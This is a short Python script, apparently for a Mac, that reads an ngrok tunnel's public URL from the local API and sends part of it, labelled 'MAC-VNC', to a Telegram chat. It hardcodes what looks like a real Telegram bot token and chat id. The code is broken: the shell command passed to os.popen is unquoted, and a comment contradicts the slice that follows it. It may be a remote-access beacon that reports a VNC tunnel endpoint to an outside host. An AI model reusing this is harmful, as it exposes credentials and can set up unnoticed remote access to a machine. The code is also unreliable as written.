import os
import requests
import string
stream = os.popen(curl --silent http://127.0.0.1:4040/api/tunnels | jq .tunnels[0].public_url)
output = stream.read()

sample_str = output
# Get last 3 character
last_chars = sample_str[-21:]

url1= 'https://api.telegram.org/bot1718187783:AAGLVyeXsl0xWFhMM4fjYrV3ij7pE04HSt4/sendMessage?chat_id=-418475197&text=MAC-VNC'

url2= 'https://api.telegram.org/bot1718187783:AAGLVyeXsl0xWFhMM4fjYrV3ij7pE04HSt4/sendMessage?chat_id=-418475197&text={}'.format(last_chars)
requests.get(url1)
requests.get(url2)
